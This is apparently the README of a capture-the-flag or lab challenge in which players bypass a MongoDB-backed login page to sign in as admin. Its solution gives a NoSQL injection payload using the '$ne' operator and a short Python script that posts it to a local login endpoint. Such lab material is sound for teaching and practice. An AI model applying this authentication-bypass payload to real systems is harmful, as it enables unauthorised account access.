# NoSQL Injection
Objective is for the player to perform a NoSQL injection on the login page and login as admin.

## Setup
Build and run docker container

## Solution
The standard NoSQL injection for MongoDB is `{"username": {"$ne": "null"}, "password": {"$ne": "null"}}`. This is will return the login as the first user in the DB. Since the first user entered into the DB is bob the injection has to be modified to: `{"username": "admin", "password": {"$ne": "null"}}`. The injection will have to either be done from the console or a script since the normal login form will escape the user input.  
The easiest way to do the injection is:
```python
import requests
url = "http://localhost:4000/login"
data = {"username": "admin", "password": {"$ne": "null"}}
r = requests.post(url, json=data)
print r.text
```
